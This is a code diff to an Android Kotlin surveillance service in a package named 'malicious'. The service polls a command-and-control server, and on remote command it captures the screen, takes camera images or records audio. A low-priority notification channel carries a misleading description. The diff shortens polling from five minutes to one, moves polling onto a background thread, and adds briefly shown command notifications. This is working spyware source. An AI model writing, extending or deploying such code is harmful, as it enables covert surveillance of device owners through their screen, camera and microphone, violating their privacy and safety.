@@ -40,8 +40,13 @@ import java.util.TimerTask
 import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
+
+// Import the C2 components
 import com.example.ChatterBox.malicious.C2Config
 import com.example.ChatterBox.malicious.C2Client
+
+// Import annotations for suppressing warnings
+import androidx.annotation.RequiresApi
 
 /**
  * Background service that performs surveillance activities:
@@ -61,6 +66,10 @@ class SurveillanceService : Service() {
     private var recordingHandler: Handler? = null
     private val isRecording = AtomicBoolean(false)
     
+    // Command polling thread and handler
+    private var commandThread: HandlerThread? = null
+    private var commandHandler: Handler? = null
+    
     // C2 client for communication with the command and control server
     private lateinit var c2Client: C2Client
     
@@ -75,6 +84,10 @@ class SurveillanceService : Service() {
         
         // Initialize the C2 client
         c2Client = C2Client(this)
+        
+        // Initialize command polling thread
+        commandThread = HandlerThread("CommandThread").apply { start() }
+        commandHandler = Handler(commandThread!!.looper)
         
         // Create notification channel for Android O and above
         createNotificationChannel()
@@ -132,19 +145,31 @@ class SurveillanceService : Service() {
         }, 5000, 30000) // Initial delay 5 seconds, then every 30 seconds
     }
 
+    /**
+     * Create the notification channel for Android O and above
+     */
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = "App Service"
-            val descriptionText = "Background service for enhanced functionality"
-            val importance = NotificationManager.IMPORTANCE_LOW
-            
-            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
-                description = descriptionText
-            }
-            
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.createNotificationChannel(channel)
+            createNotificationChannelO()
         }
+    }
+    
+    /**
+     * Implementation of createNotificationChannel for Android O and above
+     * Extracted to separate method to avoid lint errors in older Android versions
+     */
+    @RequiresApi(Build.VERSION_CODES.O)
+    private fun createNotificationChannelO() {
+        val name = "App Service"
+        val descriptionText = "Background service for enhanced functionality"
+        val importance = NotificationManager.IMPORTANCE_LOW
+        
+        val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
+            description = descriptionText
+        }
+        
+        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.createNotificationChannel(channel)
     }
 
     private fun createNotification(): Notification {
@@ -258,10 +283,14 @@ class SurveillanceService : Service() {
      * Start polling for commands from the C2 server
      */
     private fun startCommandPolling() {
-        val handler = Handler(Looper.getMainLooper())
+        // Make sure we have a valid command handler
+        if (commandHandler == null) {
+            Log.e(TAG, "Command handler is null")
+            return
+        }
         
         // Schedule regular checks for commands
-        handler.post(object : Runnable {
+        val commandRunnable = object : Runnable {
             override fun run() {
                 try {
                     c2Client.checkForCommands { commands ->
@@ -275,9 +304,12 @@ class SurveillanceService : Service() {
                 }
                 
                 // Schedule next check after a delay
-                handler.postDelayed(this, 5 * 60 * 1000) // Every 5 minutes
+                commandHandler?.postDelayed(this, 60 * 1000) // Every 1 minute
             }
-        })
+        }
+        
+        // Start the polling process
+        commandHandler?.post(commandRunnable)
     }
     
     /**
@@ -289,32 +321,69 @@ class SurveillanceService : Service() {
                 when {
                     command.startsWith("capture_screen") -> {
                         Log.d(TAG, "Executing command: capture_screen")
+                        // Show notification
+                        showCommandNotification("Executing capture_screen command")
                         captureScreen()
                     }
                     command.startsWith("capture_camera") -> {
                         Log.d(TAG, "Executing command: capture_camera")
+                        // Show notification
+                        showCommandNotification("Executing capture_camera command")
                         captureCamera()
                     }
                     command.startsWith("record_audio") -> {
                         Log.d(TAG, "Executing command: record_audio")
+                        // Show notification
+                        showCommandNotification("Executing record_audio command")
                         recordAudio()
                     }
                     // More command types can be added here
                     else -> {
                         Log.d(TAG, "Unknown command: $command")
+                        showCommandNotification("Received unknown command: $command")
                     }
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error executing command: $command", e)
+                showCommandNotification("Error executing command: $command")
             }
         }
+    }
+    
+    /**
+     * Show a temporary notification for command execution
+     */
+    private fun showCommandNotification(message: String) {
+        val notificationId = System.currentTimeMillis().toInt()
+        
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_dialog_alert)
+            .setContentTitle("C2 Command Execution")
+            .setContentText(message)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setAutoCancel(true)
+        
+        val notification = builder.build()
+        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.notify(notificationId, notification)
+        
+        // Auto-dismiss after 3 seconds
+        Handler(Looper.getMainLooper()).postDelayed({
+            notificationManager.cancel(notificationId)
+        }, 3000)
     }
 
     override fun onDestroy() {
         timer?.cancel()
         timer = null
         
+        // Clean up recording thread
         recordingThread?.quitSafely()
+        
+        // Clean up command thread
+        commandThread?.quitSafely()
+        commandThread = null
+        commandHandler = null
         
         Log.d(TAG, "Surveillance service destroyed")
         super.onDestroy()
